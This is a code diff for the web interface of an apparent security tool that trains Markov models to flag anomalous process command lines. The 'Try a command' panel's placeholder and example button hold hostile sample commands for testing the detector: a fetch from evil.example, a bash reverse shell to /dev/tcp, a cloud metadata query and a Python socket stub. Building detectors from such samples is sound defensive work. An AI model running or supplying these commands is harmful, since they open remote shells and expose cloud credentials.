                   <div class="ml-model-card-actions">
+                    <button type="button" class="btn ghost tiny" data-anomark-inspect="${esc(m.id)}">Inspect</button>
                     <button type="button" class="btn ghost tiny" data-anomark-fav="${esc(m.id)}" data-fav="${m.favorite ? "0" : "1"}">${m.favorite ? "Unstar" : "Star"}</button>
                     <button type="button" class="btn ghost tiny" data-anomark-del="${esc(m.id)}">Delete</button>
                   </div>
@@ -3855,71 +4162,19 @@
               }).join("")}
             </div>`}
           </section>
+          ${selectedModel && (!state._anomarkLastTrain || selectedModel.id !== (state._anomarkLastTrain.train_id || state._anomarkLastTrain.record?.id))
+            ? anomarkModelDetailHtml(
+              selectedModel,
+              state._anomarkInspect?.id === selectedModel.id ? state._anomarkInspect : null,
+              null
+            )
+            : ""}`;
 
+    const scoreHostsPanel = `
           <section class="panel ml-card">
-            <div class="panel-head">
-              <h3>Auto after scan</h3>
-              <span class="tag">${auto.enabled ? "enabled" : "off"}</span>
+            <div class="panel-head"><h3>Score hosts</h3>
+              <span class="muted">${esc(selectedModel?.name || "platform default")}</span>
             </div>
-            <form class="form ml-panel-body" id="anomarkAutoForm">
-              <label class="sift-check" style="padding-top:0">
-                <input type="checkbox" name="enabled" ${auto.enabled ? "checked" : ""} />
-                Score automatically after successful scans
-              </label>
-              <label>Model
-                <select name="model_id">
-                  <option value="">Platform default</option>
-                  ${models.map((m) => `<option value="${esc(m.id)}" ${(auto.model_id || "") === m.id ? "selected" : ""}>${esc(m.name || m.id)}</option>`).join("")}
-                </select>
-              </label>
-              <div class="ml-form-grid">
-                <label>Suspect percentile
-                  <input type="number" name="suspect_percent" min="50" max="99.9" step="0.1" value="${esc(String(auto.suspect_percent ?? 95))}" />
-                </label>
-                <label>Max commands / host
-                  <input type="number" name="max_commands" min="100" max="100000" step="100" value="${esc(String(auto.max_commands ?? 5000))}" />
-                </label>
-              </div>
-              <label>Check sets <span class="muted">(comma-separated; empty = any)</span>
-                <input type="text" name="check_sets" value="${esc(checkSets)}" placeholder="standard, deep, incident, virtual-import" />
-              </label>
-              <div class="ml-form-grid">
-                <label>Tags <span class="muted">(all must match; empty = any)</span>
-                  <input type="text" name="tags" value="${esc((auto.tags || []).join(", "))}" placeholder="prod, linux" list="anomarkAutoTagList" />
-                  <datalist id="anomarkAutoTagList">${siftKnownTags().map((t) => `<option value="${esc(t)}"></option>`).join("")}</datalist>
-                </label>
-                <label>Env
-                  <select name="env">
-                    <option value="">All envs</option>
-                    ${[...new Set((state.hosts || []).map((h) => h.labels?.env).filter(Boolean))].sort().map((e) => `<option value="${esc(e)}" ${(auto.labels?.env || "") === e ? "selected" : ""}>${esc(e)}</option>`).join("")}
-                  </select>
-                </label>
-                <label>Kind
-                  <select name="agent_kind">
-                    <option value="" ${!(auto.agent_kind) ? "selected" : ""}>All kinds</option>
-                    <option value="ssh" ${auto.agent_kind === "ssh" ? "selected" : ""}>SSH</option>
-                    <option value="virtual" ${auto.agent_kind === "virtual" ? "selected" : ""}>Virtual</option>
-                  </select>
-                </label>
-              </div>
-              <p class="muted" style="font-size:0.8rem;margin:0.35rem 0 0.25rem">Optional host allow-list (empty = all hosts matching filters above)</p>
-              ${anomarkHostOptions(
-                state._anomarkAutoHostSel || auto.host_ids || [],
-                "anomark-auto-host-cb",
-                "anomarkAuto"
-              )}
-              <div class="toolbar" style="margin-top:0.55rem">
-                <button type="submit" class="btn primary">Save auto config</button>
-                <button type="button" class="btn ghost" id="btnAnoMarkAutoSelectVisible">Select visible</button>
-                <button type="button" class="btn ghost" id="btnAnoMarkAutoClearHosts">Clear hosts</button>
-              </div>
-            </form>
-          </section>
-        </div>
-
-        <div class="ml-split ml-split--anomark">
-          <section class="panel ml-card">
-            <div class="panel-head"><h3>Apply to hosts</h3></div>
             <div class="ml-panel-body stack">
               <div class="ml-apply-bar">
                 <label>Model
@@ -3946,7 +4201,20 @@
                     <div class="stat crit"><div class="label">Suspects</div><div class="value">${esc(String(last.total_suspects ?? 0))}</div></div>
                     <div class="stat"><div class="label">Hosts</div><div class="value">${esc(String((last.hosts || []).length))}</div></div>
                     ${last.inventory ? `<div class="stat"><div class="label">Scan #</div><div class="value">${esc(String(last.inventory))}</div></div>` : ""}
+                    ${last._elapsed_ms != null ? `<div class="stat"><div class="label">Elapsed</div><div class="value" style="font-size:0.9rem">${esc(String(last._elapsed_ms))} ms</div></div>` : ""}
                   </div>
+                  <details class="ml-details ml-debug-panel" open>
+                    <summary>Apply debug</summary>
+                    <div class="ml-debug-grid">
+                      <div><dt>Model</dt><dd class="mono">${esc(last.model_id || "platform default")}</dd></div>
+                      <div><dt>Suspect %</dt><dd class="mono">${esc(String(last.suspect_percent ?? "—"))}</dd></div>
+                      <div><dt>Inventory</dt><dd class="mono">#${esc(String(last.inventory ?? "1"))}</dd></div>
+                      <div><dt>Hosts requested</dt><dd class="mono">${esc(String(last._host_count ?? (last.hosts || []).length))}</dd></div>
+                    </div>
+                    ${last._debug?.length ? `<ul class="ml-debug-log">${last._debug.map((d) => `
+                      <li><span class="mono muted">${esc(d.ts || "")}</span> ${esc(d.msg || "")}</li>
+                    `).join("")}</ul>` : ""}
+                  </details>
                   ${(last.hosts || []).map((h) => `
                     <details class="ml-details" ${(h.suspects || 0) > 0 ? "open" : ""}>
                       <summary><strong>${esc(h.display_name)}</strong>
@@ -3965,37 +4233,144 @@
                     </details>`).join("")}
                 </div>` : `<p class="muted" style="margin:0.75rem 0 0;font-size:0.85rem">Select hosts and score to see suspects here.</p>`}
             </div>
-          </section>
+          </section>`;
 
+    const tryCmd = state._anomarkTryCmd ?? "";
+    const tryMachine = state._anomarkTryMachine ?? "";
+    const tryPct = state._anomarkTryPct ?? 95;
+    const tryHistory = state._anomarkTryHistory || [];
+    const scoreBatch = score?.batch ? score : null;
+    const scoreSingle = score && !score.batch ? score : null;
+
+    const tryPanel = `
           <section class="panel ml-card">
-            <div class="panel-head"><h3>Score one command</h3></div>
+            <div class="panel-head"><h3>Try a command</h3></div>
             <form class="form ml-panel-body" id="anomarkScoreForm">
-              <label>Command
-                <input type="text" name="command" placeholder="/usr/bin/curl http://…" required />
+              <p class="muted" style="font-size:0.82rem;margin:0 0 0.65rem">
+                Score one or more command lines against a trained model. One command per line for batch try.
+              </p>
+              <label>Command(s)
+                <textarea name="command" id="anomarkTryCmd" rows="4" class="mono" required
+                  placeholder="/usr/bin/curl http://evil.example/x&#10;/bin/bash -c 'id'&#10;sshd: /usr/sbin/sshd -D">${esc(tryCmd)}</textarea>
               </label>
-              <label>Model
-                <select name="model_id">
-                  <option value="">Platform default</option>
-                  ${models.map((m) => `<option value="${esc(m.id)}" ${m.id === selected ? "selected" : ""}>${esc(m.name || shortId(m.id))}</option>`).join("")}
-                </select>
-              </label>
-              <div class="toolbar">
-                <button type="submit" class="btn primary">Score</button>
+              <div class="ml-form-grid">
+                <label>Model
+                  <select name="model_id" id="anomarkTryModel">
+                    <option value="">Platform default</option>
+                    ${models.map((m) => `<option value="${esc(m.id)}" ${(state._anomarkTryModel || selected) === m.id ? "selected" : ""}>${esc(m.name || shortId(m.id))}</option>`).join("")}
+                  </select>
+                </label>
+                <label>Machine label <span class="muted">(optional)</span>
+                  <input name="machine" id="anomarkTryMachine" type="text" placeholder="hostname prefix in scored line" value="${esc(tryMachine)}" />
+                </label>
+                <label>Suspect % <span class="muted">(lower = more sensitive)</span>
+                  <input name="suspect_percent" id="anomarkTryPct" type="number" min="55" max="99.9" step="0.1" value="${esc(String(tryPct))}" />
+                </label>
               </div>
-              ${score ? `
-                <div class="ml-score-card">
-                  <div class="ml-score-row"><span class="muted">Likelihood (ln)</span><strong class="mono">${esc(String(score.log_likelihood ?? score.ln_likelihood ?? "—"))}</strong></div>
-                  <div class="ml-score-row"><span class="muted">Margin</span><strong class="mono">${esc(String(score.margin_ln ?? score.margin ?? "—"))}</strong></div>
-                  <div class="ml-score-row"><span class="muted">Suspect</span><strong>${score.suspect || score.is_suspect ? "yes" : "no"}</strong></div>
+              <div class="toolbar" style="gap:0.45rem;flex-wrap:wrap">
+                <button type="submit" class="btn primary" id="anomarkTrySubmit">Score</button>
+                <button type="button" class="btn ghost" id="anomarkTryExample" title="Insert example lines">Examples</button>
+                <button type="button" class="btn ghost" id="anomarkTryClear">Clear</button>
+              </div>
+              ${scoreSingle ? `
+                <div class="ml-score-card ${scoreSingle.is_suspect || scoreSingle.suspect ? "ml-score-card--suspect" : "ml-score-card--ok"}">
+                  <div class="ml-score-verdict">
+                    ${(scoreSingle.is_suspect || scoreSingle.suspect)
+                      ? `<span class="pill warn">Suspect</span>`
+                      : `<span class="pill ok">Benign</span>`}
+                    <span class="muted mono">margin ${esc(Number(scoreSingle.margin_ln ?? scoreSingle.margin ?? 0).toFixed(3))} ln</span>
+                  </div>
+                  <div class="ml-score-row"><span class="muted">Likelihood (ln)</span><strong class="mono">${esc(Number(scoreSingle.log_likelihood ?? scoreSingle.ln_likelihood ?? 0).toFixed(4))}</strong></div>
+                  <div class="ml-score-row"><span class="muted">Threshold (ln)</span><strong class="mono">${esc(Number(scoreSingle.suspect_threshold_ln ?? 0).toFixed(4))}</strong></div>
+                  <div class="ml-score-row"><span class="muted">Suspect %</span><strong class="mono">${esc(String(scoreSingle.suspect_percent_used ?? tryPct))}</strong></div>
+                  <div class="ml-score-row"><span class="muted">Order</span><strong class="mono">${esc(String(scoreSingle.order ?? "—"))}</strong></div>
+                  <div class="ml-score-row"><span class="muted">Source</span><strong class="mono">${esc(scoreSingle.source || "—")}${scoreSingle.train_id ? ` · ${esc(shortId(scoreSingle.train_id))}` : ""}</strong></div>
+                  ${scoreSingle.line_scored ? `<div class="ml-score-row"><span class="muted">Line scored</span><strong class="mono ml-cmd-cell">${esc(scoreSingle.line_scored)}</strong></div>` : ""}
+                  <div class="ml-margin-bar" title="Margin relative to threshold">
+                    <div class="ml-margin-track">
+                      <span class="ml-margin-fill ${(scoreSingle.is_suspect || scoreSingle.suspect) ? "is-suspect" : "is-ok"}"
+                        style="width:${esc(String(Math.min(100, Math.max(4, 50 + Number(scoreSingle.margin_ln || 0) * 8))))}%"></span>
+                    </div>
+                  </div>
                   <details class="ml-details">
                     <summary>Raw response</summary>
-                    <pre class="mono ml-score-pre">${esc(JSON.stringify(score, null, 2))}</pre>
+                    <pre class="mono ml-score-pre">${esc(JSON.stringify(scoreSingle, null, 2))}</pre>
                   </details>
                 </div>
-              ` : `<p class="muted" style="margin:0.65rem 0 0;font-size:0.85rem">Paste a command line to score against the selected model.</p>`}
+              ` : ""}
+              ${scoreBatch ? `
+                <div class="ml-score-card">
+                  <div class="ml-score-verdict">
+                    <strong>${esc(String(scoreBatch.suspects || 0))}</strong>
+                    <span class="muted">suspects / ${esc(String(scoreBatch.count || 0))} scored</span>
+                  </div>
+                  <div class="ml-table-scroll" style="margin-top:0.55rem">
+                    <table class="data"><thead><tr>
+                      <th>Suspect</th><th>Margin</th><th>Likelihood</th><th>Command</th>
+                    </tr></thead><tbody>
+                      ${(scoreBatch.results || []).slice().sort((a, b) => Number(a.margin_ln || 0) - Number(b.margin_ln || 0)).map((r) => `<tr class="${r.is_suspect ? "ml-row-suspect" : ""}">
+                        <td>${r.is_suspect ? `<span class="pill warn">yes</span>` : `<span class="pill ok">no</span>`}</td>
+                        <td class="mono">${esc(Number(r.margin_ln || 0).toFixed(3))}</td>
+                        <td class="mono">${esc(Number(r.log_likelihood || 0).toFixed(3))}</td>
+                        <td class="mono ml-cmd-cell" title="${esc(r.line_scored || "")}">${esc(r.line_scored || "—")}</td>
+                      </tr>`).join("")}
+                    </tbody></table>
+                  </div>
+                </div>
+              ` : (!score ? `<p class="muted" style="margin:0.65rem 0 0;font-size:0.85rem">Paste a command line (or several) to score against the selected model.</p>` : "")}
+              ${tryHistory.length ? `
+                <details class="ml-details" open>
+                  <summary>Recent tries (${tryHistory.length})</summary>
+                  <ul class="sift-detail-notes ml-try-history">
+                    ${tryHistory.slice(0, 12).map((h, i) => `<li>
+                      <button type="button" class="btn ghost tiny" data-anomark-replay="${i}">Reuse</button>
+                      ${h.suspect ? `<span class="pill warn">suspect</span>` : `<span class="pill ok">ok</span>`}
+                      <span class="mono ml-cmd-cell">${esc(h.preview || "")}</span>
+                    </li>`).join("")}
+                  </ul>
+                </details>` : ""}
             </form>
-          </section>
+          </section>`;
+
+    const tabBody = tab === "score"
+      ? scoreHostsPanel
+      : tab === "try"
+        ? tryPanel
+        : modelsPanel;
+
+    const mlRule = (state.checks || []).find((c) => c.is_anomark || c.id === "RM-ML-0001");
+
+    return `
+      <div class="ml-workspace">
+        <header class="ml-hero panel">
+          <div class="ml-hero-copy">
+            <p class="ml-eyebrow">Command Markov models</p>
+            <h2>AnoMark</h2>
+            <p class="muted">Train models and score commands. Post-scan scoring is configured as rule <span class="mono">RM-ML-0001</span> under Rules.</p>
+          </div>
+          <div class="ml-hero-actions">
+            ${tab === "models" ? `<button type="button" class="btn primary" id="btnAnoMarkNew">Train model</button>` : ""}
+            <button type="button" class="btn ghost" id="btnAnoMarkOpenRule" title="Open AnoMark rule in Rules">Post-scan rule</button>
+            <button type="button" class="btn ghost" id="btnAnoMarkRefresh">Refresh</button>
+          </div>
+        </header>
+
+        <div class="stats ml-kpi-row">
+          <div class="stat"><div class="label">Models</div><div class="value">${models.length.toLocaleString()}</div></div>
+          <div class="stat ${avail.any_available === false ? "crit" : ""}"><div class="label">Ready</div><div class="value">${avail.any_available === false ? "0" : String(readyCount)}</div></div>
+          <div class="stat"><div class="label">Post-scan rule</div><div class="value" style="font-size:0.9rem">${mlRule ? (mlRule.enabled ? "On" : "Off") : "—"}</div></div>
+          <div class="stat"><div class="label">Active model</div><div class="value" style="font-size:0.9rem">${esc(selectedModel?.name || (selected ? shortId(selected) : "—"))}</div></div>
         </div>
+
+        ${anomarkProgressHtml()}
+
+        ${mlSubTabsHtml([
+          ["models", "Models", models.length || null],
+          ["score", "Score hosts", last ? suspectTotal : null],
+          ["try", "Try command"],
+        ], tab, "data-anomark-tab")}
+
+        ${tabBody}
       </div>`;
   }
 
@@ -4059,15 +4434,90 @@
         lines: String(fd.get("lines") || "").trim() || null,
         path: String(fd.get("path") || "").trim() || null,
       };
+      const t0 = performance.now();
+      const debug = [
+        { ts: mlDebugNow(), msg: `Train “${body.name}” · order=${body.order} · inventory=#${inventory}` },
+        { ts: mlDebugNow(), msg: host_ids.length
+          ? `${host_ids.length} host(s) selected`
+          : (body.lines ? "Using pasted lines" : body.path ? `path=${body.path}` : "No host/lines/path") },
+      ];
+      state._anomarkProgress = {
+        title: "Training AnoMark model",
+        phase: "Collect commands",
+        detail: host_ids.length
+          ? `Pulling process cmdlines from scan #${inventory}…`
+          : "Preparing training input…",
+        pct: 25,
+        indeterminate: true,
+        debug,
+        steps: [
+          { label: "Collect input", status: "active" },
+          { label: "Train Markov model", status: "pending" },
+          { label: "Persist model", status: "pending" },
+        ],
+      };
+      closeDrawer();
+      state._anomarkTab = "models";
+      render();
       try {
-        const res = await api("/v1/anomark/models", { method: "POST", body });
-        toast(`Trained ${res.record?.name || body.name}`);
-        state._anomarkSelectedModel = res.train_id || res.record?.id;
-        closeDrawer();
-        await refreshAnoMark();
+        mlPushDebug("_anomarkProgress", "POST /v1/anomark/models…");
+        state._anomarkProgress = {
+          ...state._anomarkProgress,
+          phase: "Train Markov model",
+          detail: "Fitting character Markov model…",
+          pct: 55,
+          steps: [
+            { label: "Collect input", status: "done" },
+            { label: "Train Markov model", status: "active" },
+            { label: "Persist model", status: "pending" },
+          ],
+        };
         render();
+        const res = await api("/v1/anomark/models", { method: "POST", body });
+        const elapsed_ms = Math.round(performance.now() - t0);
+        const trainId = res.train_id || res.record?.id;
+        state._anomarkSelectedModel = trainId;
+        state._anomarkLastTrain = {
+          ...res,
+          _elapsed_ms: elapsed_ms,
+          _debug: [
+            ...debug,
+            { ts: mlDebugNow(), msg: `Trained ${res.record?.training_line_count ?? "?"} lines in ${elapsed_ms}ms` },
+            { ts: mlDebugNow(), msg: `Model id ${trainId}` },
+          ],
+        };
+        state._anomarkProgress = {
+          title: "Training complete",
+          phase: "Done",
+          detail: `${res.record?.name || body.name} · ${res.record?.training_line_count ?? "?"} lines · ${elapsed_ms}ms`,
+          pct: 100,
+          indeterminate: false,
+          debug: state._anomarkLastTrain._debug,
+          steps: [
+            { label: "Collect input", status: "done" },
+            { label: "Train Markov model", status: "done" },
+            { label: "Persist model", status: "done" },
+          ],
+        };
+        await refreshAnoMark();
+        try {
+          const insp = await api(`/v1/anomark/models/${encodeURIComponent(trainId)}/inspect`);
+          state._anomarkInspect = { ...insp, id: trainId };
+          state._anomarkLastTrain._debug.push({
+            ts: mlDebugNow(),
+            msg: `Inspect: order=${insp.order} contexts=${insp.num_contexts} transitions=${insp.num_transitions} size=${insp.file_size_bytes}B`,
+          });
+        } catch (_) {}
+        toast(`Trained ${res.record?.name || body.name} · ${res.record?.training_line_count ?? "?"} lines · ${elapsed_ms}ms`);
+        render();
+        window.setTimeout(() => {
+          state._anomarkProgress = null;
+          if (state.view === "anomark") render();
+        }, 3200);
       } catch (err) {
+        state._anomarkProgress = null;
         toast(err.message || "Train failed");
+        render();
       }
     });
   }
@@ -4109,6 +4559,8 @@
   }
 
   function wireAnoMark() {
+    wireMlSubTabs("data-anomark-tab", "_anomarkTab", ["models", "score", "try"]);
+
     const btnRef = $("#btnAnoMarkRefresh");
     if (btnRef) {
       btnRef.addEventListener("click", async () => {
@@ -4128,6 +4580,27 @@
         if (e.target.closest("button")) return;
         state._anomarkSelectedModel = row.getAttribute("data-anomark-pick");
         render();
+      });
+    });
+    $$("[data-anomark-inspect]").forEach((btn) => {
+      btn.addEventListener("click", async (e) => {
+        e.preventDefault();
+        e.stopPropagation();
+        const id = btn.getAttribute("data-anomark-inspect");
+        if (!id) return;
+        btn.disabled = true;
+        try {
+          const insp = await api(`/v1/anomark/models/${encodeURIComponent(id)}/inspect`);
+          state._anomarkInspect = { ...insp, id };
+          state._anomarkSelectedModel = id;
+          state._anomarkTab = "models";
+          toast(`Inspected ${shortId(id)} · order ${insp.order} · ${insp.num_contexts} contexts`);
+          render();
+        } catch (err) {
+          toast(err.message || "Inspect failed");
+        } finally {
+          btn.disabled = false;
+        }
       });
     });
     $$("[data-anomark-fav]").forEach((btn) => {
@@ -4164,73 +4637,11 @@
       });
     });
 
-    const autoForm = $("#anomarkAutoForm");
-    if (autoForm) {
-      wireAnoMarkHostFilters("anomarkAuto", () => {
-        const visible = new Set(
-          anomarkFilteredHosts({
-            q: state._anomarkAutoHostQ,
-            env: state._anomarkAutoHostEnv,
-            kind: state._anomarkAutoHostKind,
-            tag: state._anomarkAutoHostTag,
-          }).map((h) => h.id)
-        );
-        const prev = new Set(state._anomarkAutoHostSel || state._anomarkAuto?.host_ids || []);
-        const checked = $$(".anomark-auto-host-cb:checked").map((c) => c.value);
-        // Keep selections that are currently hidden by filters.
-        const kept = [...prev].filter((id) => !visible.has(id));
-        state._anomarkAutoHostSel = [...new Set([...kept, ...checked])];
-        render();
-      });
-      const selAutoVis = $("#btnAnoMarkAutoSelectVisible");
-      if (selAutoVis) {
-        selAutoVis.addEventListener("click", () => {
-          $$(".anomark-auto-host-cb").forEach((c) => { c.checked = true; });
-        });
-      }
-      const clearAutoHosts = $("#btnAnoMarkAutoClearHosts");
-      if (clearAutoHosts) {
-        clearAutoHosts.addEventListener("click", () => {
-          $$(".anomark-auto-host-cb").forEach((c) => { c.checked = false; });
-        });
-      }
-      autoForm.addEventListener("submit", async (e) => {
-        e.preventDefault();
-        const fd = new FormData(autoForm);
-        const check_sets = String(fd.get("check_sets") || "")
-          .split(",")
-          .map((s) => s.trim())
-          .filter(Boolean);
-        const tags = String(fd.get("tags") || "")
-          .split(",")
-          .map((s) => s.trim())
-          .filter(Boolean);
-        const env = String(fd.get("env") || "").trim();
-        const agent_kind = String(fd.get("agent_kind") || "").trim() || null;
-        const host_ids = $$(".anomark-auto-host-cb:checked").map((c) => c.value).filter(Boolean);
-        const labels = {};
-        if (env) labels.env = env;
-        const body = {
-          enabled: !!fd.get("enabled"),
-          model_id: String(fd.get("model_id") || "").trim() || null,
-          suspect_percent: Number(fd.get("suspect_percent") || 95),
-          max_commands: Number(fd.get("max_commands") || 5000),
-          check_sets,
-          tags,
-          labels,
-          agent_kind,
-          host_ids,
-        };
-        try {
-          state._anomarkAuto = await api("/v1/anomark/auto", { method: "PUT", body });
-          state._anomarkAutoHostSel = host_ids;
-          toast(body.enabled ? "Auto AnoMark enabled" : "Auto AnoMark saved (disabled)");
-          render();
-        } catch (err) {
-          toast(err.message);
-        }
-      });
-    }
+    $("#btnAnoMarkOpenRule")?.addEventListener("click", () => {
+      state.selectedCheckId = "RM-ML-0001";
+      state.checkDetail = null;
+      setView("checks");
+    });
 
     wireAnoMarkHostFilters("anomark", () => {
       const visible = new Set(
@@ -4285,8 +4696,40 @@
         const inventory = String($("#anomarkApplyInventory")?.value || state._anomarkApplyInventory || "1");
         state._anomarkApplyInventory = inventory;
         const fleet_run = false;
+        const t0 = performance.now();
+        const debug = [
+          { ts: mlDebugNow(), msg: `Apply · ${host_ids.length} host(s) · scan #${inventory} · suspect=${suspect_percent}%` },
+          { ts: mlDebugNow(), msg: `Model: ${model_id || "platform default"}` },
+        ];
+        state._anomarkProgress = {
+          title: "Scoring hosts with AnoMark",
+          phase: "Load inventory",
+          detail: `Reading process cmdlines from scan #${inventory}…`,
+          pct: 20,
+          indeterminate: true,
+          debug,
+          steps: [
+            { label: "Load inventory", status: "active" },
+            { label: "Score commands", status: "pending" },
+            { label: "Summarize", status: "pending" },
+          ],
+        };
         btnApply.disabled = true;
+        render();
         try {
+          mlPushDebug("_anomarkProgress", "POST /v1/anomark/apply…");
+          state._anomarkProgress = {
+            ...state._anomarkProgress,
+            phase: "Score commands",
+            detail: `Scoring up to 5000 commands / host…`,
+            pct: 60,
+            steps: [
+              { label: "Load inventory", status: "done" },
+              { label: "Score commands", status: "active" },
+              { label: "Summarize", status: "pending" },
+            ],
+          };
+          render();
           const res = await api("/v1/anomark/apply", {
             method: "POST",
             body: {
@@ -4298,12 +4741,45 @@
               max_commands: 5000,
             },
           });
-          state._anomarkLastApply = res;
+          const elapsed_ms = Math.round(performance.now() - t0);
+          const hostSummary = (res.hosts || [])
+            .map((h) => `${h.display_name}: ${h.suspects}/${h.scored}`)
+            .slice(0, 8);
+          state._anomarkLastApply = {
+            ...res,
+            _elapsed_ms: elapsed_ms,
+            _host_count: host_ids.length,
+            _debug: [
+              ...debug,
+              { ts: mlDebugNow(), msg: `${res.total_suspects || 0} suspects / ${res.total_scored || 0} scored in ${elapsed_ms}ms` },
+              ...hostSummary.map((msg) => ({ ts: mlDebugNow(), msg })),
+            ],
+          };
           state._anomarkSelectedModel = model_id || state._anomarkSelectedModel;
-          toast(`AnoMark: ${res.total_suspects || 0} suspects / ${res.total_scored || 0} scored (scan #${inventory})`);
+          state._anomarkTab = "score";
+          state._anomarkProgress = {
+            title: "Scoring complete",
+            phase: "Done",
+            detail: `${res.total_suspects || 0} suspects / ${res.total_scored || 0} scored · ${elapsed_ms}ms`,
+            pct: 100,
+            indeterminate: false,
+            debug: state._anomarkLastApply._debug,
+            steps: [
+              { label: "Load inventory", status: "done" },
+              { label: "Score commands", status: "done" },
+              { label: "Summarize", status: "done" },
+            ],
+          };
+          toast(`AnoMark: ${res.total_suspects || 0} suspects / ${res.total_scored || 0} scored (scan #${inventory}, ${elapsed_ms}ms)`);
           render();
+          window.setTimeout(() => {
+            state._anomarkProgress = null;
+            if (state.view === "anomark") render();
+          }, 2800);
         } catch (err) {
+          state._anomarkProgress = null;
           toast(err.message || "Apply failed");
+          render();
         } finally {
           btnApply.disabled = false;
         }
@@ -4312,22 +4788,92 @@
 
     const scoreForm = $("#anomarkScoreForm");
     if (scoreForm) {
+      const saveTryFields = () => {
+        const cmdEl = $("#anomarkTryCmd");
+        const machEl = $("#anomarkTryMachine");
+        const pctEl = $("#anomarkTryPct");
+        const modelEl = $("#anomarkTryModel");
+        if (cmdEl) state._anomarkTryCmd = cmdEl.value || "";
+        if (machEl) state._anomarkTryMachine = machEl.value || "";
+        if (pctEl) state._anomarkTryPct = Number(pctEl.value) || 95;
+        if (modelEl) state._anomarkTryModel = modelEl.value || "";
+      };
       scoreForm.addEventListener("submit", async (e) => {
         e.preventDefault();
-        const fd = new FormData(scoreForm);
+        saveTryFields();
+        const raw = String(state._anomarkTryCmd || "");
+        const lines = raw.split(/\r?\n/).map((s) => s.trim()).filter(Boolean);
+        if (!lines.length) {
+          toast("Enter at least one command");
+          return;
+        }
+        const btn = $("#anomarkTrySubmit");
+        if (btn) btn.disabled = true;
         try {
-          state._anomarkScore = await api("/v1/anomark/score", {
-            method: "POST",
-            body: {
-              command: String(fd.get("command") || ""),
-              model_id: String(fd.get("model_id") || "").trim() || null,
-              suspect_percent: 95,
-            },
+          const body = {
+            commands: lines,
+            machine: String(state._anomarkTryMachine || "").trim() || null,
+            model_id: String(state._anomarkTryModel || "").trim() || null,
+            suspect_percent: Number(state._anomarkTryPct) || 95,
+          };
+          const res = await api("/v1/anomark/score", { method: "POST", body });
+          state._anomarkScore = res;
+          const hist = state._anomarkTryHistory || [];
+          const suspect = res.batch
+            ? (res.suspects || 0) > 0
+            : !!(res.is_suspect || res.suspect);
+          hist.unshift({
+            preview: lines.length === 1 ? lines[0] : `${lines.length} commands`,
+            cmd: raw,
+            machine: state._anomarkTryMachine || "",
+            pct: state._anomarkTryPct,
+            model: state._anomarkTryModel || "",
+            suspect,
           });
+          state._anomarkTryHistory = hist.slice(0, 20);
+          toast(res.batch
+            ? `Scored ${res.count}: ${res.suspects} suspect`
+            : (suspect ? "Suspect command" : "Looks benign"));
           render();
+          const again = $("#anomarkTryCmd");
+          if (again) {
+            again.focus();
+            try { again.setSelectionRange(again.value.length, again.value.length); } catch (_) {}
+          }
         } catch (err) {
           toast(err.message);
+        } finally {
+          if (btn) btn.disabled = false;
         }
+      });
+      $("#anomarkTryExample")?.addEventListener("click", () => {
+        const el = $("#anomarkTryCmd");
+        if (!el) return;
+        el.value = [
+          "/usr/sbin/sshd -D",
+          "/usr/bin/curl -fsSL http://169.254.169.254/latest/meta-data/",
+          "/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/443 0>&1'",
+          "python3 -c 'import socket,subprocess,os'",
+        ].join("\n");
+        state._anomarkTryCmd = el.value;
+        el.focus();
+      });
+      $("#anomarkTryClear")?.addEventListener("click", () => {
+        state._anomarkTryCmd = "";
+        state._anomarkScore = null;
+        render();
+      });
+      $$("[data-anomark-replay]").forEach((btn) => {
+        btn.addEventListener("click", () => {
+          const i = Number(btn.getAttribute("data-anomark-replay"));
+          const h = (state._anomarkTryHistory || [])[i];
+          if (!h) return;
+          state._anomarkTryCmd = h.cmd || "";
+          state._anomarkTryMachine = h.machine || "";
+          state._anomarkTryPct = h.pct ?? 95;
+          state._anomarkTryModel = h.model || "";
+          render();
+        });
       });
     }
   }
@@ -4344,7 +4890,7 @@
         </p>
         <label>Root directory
           <input name="path" class="mono" required
-            placeholder="/Users/toto/Code/DATA/vpn/2026-05-10"
+            placeholder="/data/snapshots/2026-05-10"
             value="" autocomplete="off" />
         </label>
         <fieldset class="ml-device-rule" style="border:1px solid color-mix(in srgb, var(--border,#fff) 55%, transparent);border-radius:8px;padding:0.65rem 0.75rem;margin:0.5rem 0 0.75rem">
@@ -6046,10 +6592,36 @@
                   </label>
                 `).join("")}
               </div>
-              <p class="muted" style="margin:0.45rem 0 0;font-size:0.75rem">These map to Pulse / Standard / Deep / Incident scan leases.</p>
+              <p class="muted" style="margin:0.45rem 0 0;font-size:0.75rem">These map to Pulse / Standard / Deep / Incident scan leases.${detail.is_anomark ? " AnoMark runs after a successful scan when Enabled and included in the profile used for that scan." : ""}</p>
             </div>
-            <div class="rules-section-label">Where expression</div>
-            <pre class="rules-code" id="ruleWherePreview">${highlightWhere(detail.where_expr || "")}</pre>
+            ${detail.is_anomark ? `
+            <div class="rules-anomark-panel">
+              <div class="rules-section-label">AnoMark post-scan</div>
+              <p class="muted" style="font-size:0.82rem;margin:0 0 0.55rem">Scores process inventories after scans. Enable the rule and toggle scan profiles above. Changes apply to the TOML when you click Apply → Save TOML.</p>
+              <div class="ml-form-grid" id="ruleAnoMarkForm">
+                <label>Trained model
+                  <select id="ruleAnomarkModel">
+                    <option value="">Platform default</option>
+                    ${(state._anomarkModels || []).map((m) => `<option value="${esc(m.id)}" ${(detail.anomark?.model_id || "") === m.id ? "selected" : ""}>${esc(m.name || shortId(m.id))}</option>`).join("")}
+                  </select>
+                </label>
+                <label>Suspect percentile
+                  <input id="ruleAnomarkSuspect" type="number" min="55" max="99.9" step="0.1" value="${esc(String(detail.anomark?.suspect_percent ?? 95))}" />
+                </label>
+                <label>Host tags <span class="muted">(all must match; empty = any)</span>
+                  <input id="ruleAnomarkTags" type="text" value="${esc((detail.anomark?.tags || []).join(", "))}" placeholder="prod, linux" list="ruleAnomarkTagList" />
+                  <datalist id="ruleAnomarkTagList">${(typeof siftKnownTags === "function" ? siftKnownTags() : []).map((t) => `<option value="${esc(t)}"></option>`).join("")}</datalist>
+                </label>
+                <label>Max commands / host
+                  <input id="ruleAnomarkMax" type="number" min="100" max="100000" step="100" value="${esc(String(detail.anomark?.max_commands ?? 5000))}" />
+                </label>
+              </div>
+              <div class="toolbar" style="margin-top:0.55rem">
+                <button type="button" class="btn ghost" id="btnApplyAnoMarkRule">Apply to TOML editor</button>
+              </div>
+            </div>` : ""}
+            ${detail.is_anomark ? "" : `<div class="rules-section-label">Where expression</div>
+            <pre class="rules-code" id="ruleWherePreview">${highlightWhere(detail.where_expr || "")}</pre>`}
